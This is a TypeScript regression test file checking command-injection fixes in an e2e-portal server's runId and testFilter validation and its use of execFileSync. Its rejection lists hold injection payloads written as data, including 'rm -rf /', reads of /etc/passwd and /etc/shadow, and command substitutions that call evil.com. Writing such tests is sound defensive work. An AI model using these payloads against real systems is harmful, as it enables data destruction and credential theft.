/**
 * Regression tests for command-injection fixes in the e2e-portal server.
 *
 * These tests verify that:
 * 1. runId is validated as numeric-only (prevents shell metacharacter injection)
 * 2. testFilter rejects dangerous characters (prevents argument injection)
 * 3. The ghApi helper uses execFileSync (no shell interpolation)
 *
 * Resolves: GitHub Code Scanning alerts #36, #37 (js/command-line-injection)
 */
import { describe, it, expect } from "vitest";

// We test the actual route handlers by importing the app.
// Since the server file calls app.listen, we need to mock that and import carefully.
// Instead, we replicate the validation logic in a focused unit test approach.

describe("command-injection prevention", () => {
  describe("runId validation", () => {
    const VALID_RUN_IDS = ["123456", "1", "9999999999"];
    const MALICIOUS_RUN_IDS = [
      "123; rm -rf /",
      "123$(whoami)",
      "123`id`",
      "123 | cat /etc/passwd",
      "../../../etc/passwd",
      "123\n456",
      "123&& echo pwned",
      "abc",
      "",
    ];

    const runIdRegex = /^\d+$/;

    it.each(VALID_RUN_IDS)("accepts valid runId: %s", (id) => {
      expect(runIdRegex.test(id)).toBe(true);
    });

    it.each(MALICIOUS_RUN_IDS)("rejects malicious runId: %s", (id) => {
      expect(runIdRegex.test(id)).toBe(false);
    });
  });

  describe("testFilter validation", () => {
    const VALID_FILTERS = [
      "tasks.spec.ts",
      "comments, tasks",
      "my-test/subfolder",
      "test_name",
      "tests/tasks.spec.ts, tests/comments.spec.ts",
    ];
    const MALICIOUS_FILTERS = [
      '"; rm -rf /',
      "$(whoami)",
      "`id`",
      "test; cat /etc/passwd",
      "test\necho pwned",
      "test$(curl evil.com)",
      "test`curl evil.com`",
      "test|cat /etc/shadow",
      "test&& echo pwned",
      "test' OR '1'='1",
    ];

    const filterRegex = /^[a-zA-Z0-9.\-_/ ,]+$/;

    it.each(VALID_FILTERS)("accepts valid testFilter: %s", (filter) => {
      expect(filterRegex.test(filter)).toBe(true);
    });

    it.each(MALICIOUS_FILTERS)("rejects malicious testFilter: %s", (filter) => {
      expect(filterRegex.test(filter)).toBe(false);
    });
  });

  describe("execFileSync usage (no shell interpolation)", () => {
    it("server source uses execFileSync exclusively, not execSync", async () => {
      const fs = await import("fs");
      const path = await import("path");
      const { fileURLToPath } = await import("url");
      const __dir = path.dirname(fileURLToPath(import.meta.url));
      const serverSource = fs.readFileSync(
        path.resolve(__dir, "index.ts"),
        "utf-8"
      );

      // Must NOT contain execSync (shell-interpolated execution)
      expect(serverSource).not.toMatch(/\bexecSync\(/);

      // Must contain execFileSync (safe argument-array execution)
      expect(serverSource).toMatch(/\bexecFileSync\b/);
    });

    it("dispatch route uses execFileSync with argument array, not string interpolation", async () => {
      const fs = await import("fs");
      const path = await import("path");
      const { fileURLToPath } = await import("url");
      const __dir = path.dirname(fileURLToPath(import.meta.url));
      const serverSource = fs.readFileSync(
        path.resolve(__dir, "index.ts"),
        "utf-8"
      );

      // The dispatch handler should NOT build a command string with interpolation
      expect(serverSource).not.toMatch(/`gh api.*\$\{testFilter/);
      expect(serverSource).not.toMatch(/\bexecSync\(/);
    });
  });
});
